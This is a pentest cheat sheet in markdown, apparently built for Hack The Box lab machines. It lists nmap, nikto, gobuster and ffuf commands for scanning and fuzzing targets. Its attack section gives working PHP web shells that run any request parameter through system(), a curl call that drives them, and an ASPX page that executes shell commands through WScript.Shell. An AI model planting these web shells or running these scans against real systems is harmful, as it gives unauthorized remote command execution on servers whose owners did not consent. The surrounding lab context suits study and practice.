# pentest 

basic notes on penetration testing. Also have a look at 
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). 


## basics

set the following variables

```
export LHOST=10.10.14.15
export LPORT=4444
export RHOST=10.10.10.79
export RHOSTNAME=target.htb
```

### enumeration list

good sources for enumeration lists

- [seclist](https://github.com/danielmiessler/SecLists)
- [fuzzdb](https://github.com/fuzzdb-project/fuzzdb)
- [wfuzz](https://github.com/xmendez/wfuzz/tree/master/wordlist)
- [dirbuster](https://gitlab.com/kalilinux/packages/dirbuster/tree/kali/master)

recommended list for directory scanning is `directory-list-2.3-medium.txt`
 
## nmap
 
```
nmap -sS -sV -T4 -sC -O -Pn -oN nmap.txt -v $RHOST

# udp scan
nmap -sU -F -oN nmap_udp.txt -v $RHOST

# vulnaribility scan
nmap -p 445,135 --script vuln -A -Pn -v -oN nmap_details.txt $RHOST

# quick scan over all ports
nmap -p0-65535 -sS -max-retries 0 $RHOST
```
 
## web

### recon
#### nikto

```
nikto -host http://$RHOSTNAME -output nikto.txt
```

#### [gobuster](https://github.com/OJ/gobuster)

Prior to using `gobuster`, verify if any specific web technologies like PHP or ASPX are used. 
If so, relevant extentions should be included in the `-x` parameter.

```
# directory scan
gobuster -w ~/hack/lists/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://$RHOSTNAME -x aspx,txt -t 40
```
#### [ffuf](https://github.com/ffuf/ffuf)

`fuff` can be used for fuzzing specific parts of a web request

```
ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242
```

Doing `POST` requests requires to create the payloads upfront. To do so, create a `payload.txt` 
which serves as a template. Then run the following commands to create one 
file for every entry in the wordlist.

```
mkdir payloads && cd payloads
i=0; cat ~/hack/lists/wordlists/dirb/small.txt | while read line; do sed "s/FUZZ/$line/g" ../payload.txt > ${i}_payload.txt; i=$(($i+1)); done

ffuf --input-cmd 'cat $FFUF_NUM_payload.txt' -X POST -u https://target/script.php
```


### attack

#### php

Add the following snippet to file that can be executed by php.

```
<?php echo system($_REQUEST['my_command']); ?>

<?php 
  	echo "<pre>"; 
  	echo "### BEGIN Execute ### <br/>"; 
	echo system($_REQUEST['exec']); 
	echo "<br/>### END Execute ### <br/>"; 
	echo "</pre>"; 
?>
```

Execute a command by calling

```
curl http://server/uploads/you_file.php?my_command=ls
```

#### aspx

Add the following snippet to a file that can be executed by IIS.

```
<%
Const WshRunning = 0
Const WshFinished = 1
Const WshFailed = 2
strCommand = "ping 10.10.14.15"

Set WshShell = CreateObject("WScript.Shell")
Set WshShellExec = WshShell.Exec(strCommand)

Do While WshShellExec.Status = WshRunning
Loop
Response.write("<pre/>")
Response.write("Exit with ")
Response.write(WshShellExec.Status)
Response.write("<br/>StdOut: <br/>")
Response.write(WshShellExec.StdOut.Readall())
Response.write("<br/>StdErr: <br/>")
Response.write(WshShellExec.StdErr.Readall())
Response.write("<pre/>")
%>
```

## processes

On linux use [`pyspy`](https://github.com/DominicBreuker/pspy) to monitor processes

## process data

Great tool for processing data is [cybershef](https://gchq.github.io/CyberChef/)


